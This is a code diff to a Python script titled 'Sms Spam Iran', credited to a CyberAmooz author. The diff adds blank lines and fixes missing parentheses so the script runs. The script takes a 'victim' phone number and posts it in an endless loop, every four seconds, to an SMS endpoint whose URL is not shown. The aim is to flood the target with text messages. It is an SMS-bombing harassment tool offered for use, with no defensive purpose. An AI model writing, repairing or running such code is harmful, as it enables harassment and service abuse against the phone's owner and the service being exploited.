@@ -3,7 +3,9 @@ print("""
  (_-</ _ \/ _ `/  ' \  (_-</  ' \(_-<
 /___/ .__/\_,_/_/_/_/ /___/_/_/_/___/
    /_/                               
+
 # Sms Spam Iran #
+
 Creator : Milad Ranjbar
 WebSite : CyberAmooz.Com
 Telegram : t.me/CyberAmooz
@@ -15,7 +17,7 @@ import requests
 import time
 
 try:
-    print("Note : For Exit Tools ==> Ctrl + C \n"
+    print("Note : For Exit Tools ==> Ctrl + C \n")
     NumberPhone = input("Enter Number Phone (ex: 9170000000) = ")
 
     if NumberPhone == "" :
@@ -25,8 +27,8 @@ try:
         data = {"cellphone":"+98" + NumberPhone}
 
     while True:
-        requests.post(url,data=data
+        requests.post(url,data=data)
         print("[+] Send SMS For Victim")
-        time.sleep(4
+        time.sleep(4)
 except:
     print("\n[-] You Exit Tools !!")
